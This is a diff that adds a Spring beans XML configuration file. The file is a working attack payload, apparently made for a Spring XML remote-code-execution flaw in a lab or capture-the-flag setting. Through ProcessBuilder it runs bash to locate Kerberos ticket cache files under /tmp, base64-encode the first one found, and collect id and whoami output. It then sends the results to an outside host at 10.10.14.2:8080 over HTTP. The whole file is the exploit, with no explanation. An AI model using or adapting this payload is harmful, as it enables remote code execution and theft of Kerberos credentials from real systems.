@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+       http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder">
+        <constructor-arg>
+            <list>
+                <value>/bin/bash</value>
+                <value>-c</value>
+                <value><![CDATA[TGT=$(ls /tmp/krb5cc_* 2>/dev/null | head -1); echo "TGT_FILE=$TGT"; if [ -f "$TGT" ]; then B64=$(base64 -w0 "$TGT"); echo "TGT_B64=$B64"; fi; ls /tmp/krb5cc_* 2>/dev/null; id; whoami]]></value>
+            </list>
+        </constructor-arg>
+    </bean>
+    <bean id="proc" factory-bean="pb" factory-method="start"/>
+    <bean id="procOut" factory-bean="proc" factory-method="getInputStream"/>
+    <bean id="outBytes" class="org.springframework.util.FileCopyUtils"
+          factory-method="copyToByteArray">
+        <constructor-arg ref="procOut"/>
+    </bean>
+    <bean id="outStr" class="java.lang.String">
+        <constructor-arg ref="outBytes"/>
+    </bean>
+    <bean id="outUrl" class="java.net.URL" depends-on="outStr">
+        <constructor-arg value="#{'http://10.10.14.2:8080/dbg?v=' + T(java.net.URLEncoder).encode(@outStr,'UTF-8')}"/>
+    </bean>
+    <bean id="outReq" factory-bean="outUrl" factory-method="openStream" depends-on="outUrl"/>
+</beans>
